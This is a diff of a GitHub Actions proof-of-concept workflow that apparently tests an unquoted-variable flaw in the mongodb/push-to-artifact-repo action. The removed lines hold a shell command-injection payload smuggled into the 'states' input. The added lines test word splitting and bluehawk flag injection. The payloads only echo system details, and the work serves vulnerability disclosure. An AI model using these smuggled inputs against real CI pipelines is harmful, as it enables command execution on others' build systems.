@@ -7,44 +7,62 @@ on:
       - main
 
 jobs:
-  exploit-states:
+  # Test 1: States word splitting - each space-separated value becomes a state
+  exploit-states-splitting:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: POC - Command Injection via states input
+      - name: POC - States word splitting
         uses: mongodb/push-to-artifact-repo@main
         continue-on-error: true
         with:
-          # Command injection via unquoted $state in entrypoint.sh:29-30
-          # The states value is iterated unquoted: for state in $INPUT_STATES
-          # Then used unquoted: --state $state --branch $state
-          # Shell interprets ; as command separator, executing our injected commands
           email: "poc-test@example.com"
           name: "POC Tester"
-          states: "safe; echo '🚨 COMMAND INJECTION via states input 🚨' > /tmp/states-injection-poc.txt && echo 'Whoami:' $(whoami) >> /tmp/states-injection-poc.txt && echo 'Hostname:' $(hostname) >> /tmp/states-injection-poc.txt && echo 'PWD:' $(pwd) >> /tmp/states-injection-poc.txt && echo 'Date:' $(date) >> /tmp/states-injection-poc.txt; echo injected"
+          # Without quotes in the for loop, this creates unexpected iterations
+          # The loop: for state in $INPUT_STATES
+          # Will iterate over each space-separated word
+          states: "--help state1 --version"
           source: "./source"
-          # Using a dummy repo URL - the action will fail but injection executes first
           toRepo: "https://github.com/nonexistent/repo.git"
 
-      - name: Verify Injection - states input
-        shell: bash
+      - name: Analysis
         run: |
           echo "============================================"
-          echo "VERIFICATION: Command Injection via 'states' input"
+          echo "ANALYSIS: Word splitting in 'states' input"
           echo "============================================"
-          if [ -f /tmp/states-injection-poc.txt ]; then
-            echo "✅ VULNERABILITY CONFIRMED!"
-            echo ""
-            echo "The following commands were executed via injection:"
-            echo "---"
-            cat /tmp/states-injection-poc.txt
-            echo "---"
-            echo ""
-            echo "📍 Vulnerable code location: entrypoint.sh:29-30"
-            echo "   --state \$state   (unquoted variable)"
-            echo "   --branch \$state  (unquoted variable)"
-          else
-            echo "❌ Injection file not found - check action logs"
-          fi
+          echo ""
+          echo "The unquoted 'for state in \$INPUT_STATES' causes:"
+          echo "1. Loop iterates over: '--help', 'state1', '--version'"
+          echo "2. Each becomes --state X --branch X argument"
+          echo "3. This can inject arbitrary flags to bluehawk"
+          echo ""
+          echo "Check the action logs above to see how bluehawk processed these"
+
+  # Test 2: Inject extra bluehawk options via states
+  exploit-states-options:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: POC - Inject bluehawk options
+        uses: mongodb/push-to-artifact-repo@main
+        continue-on-error: true
+        with:
+          email: "poc-test@example.com"
+          name: "POC Tester"
+          # Try to inject --ignore or other bluehawk options
+          states: "safe --ignore=*.secret"
+          source: "./source"
+          toRepo: "https://github.com/nonexistent/repo.git"
+
+      - name: Analysis
+        run: |
+          echo "============================================"
+          echo "ANALYSIS: Option injection via 'states'"
+          echo "============================================"
+          echo ""
+          echo "Attempted to inject: --ignore=*.secret"
+          echo "This demonstrates how unquoted vars allow flag injection"
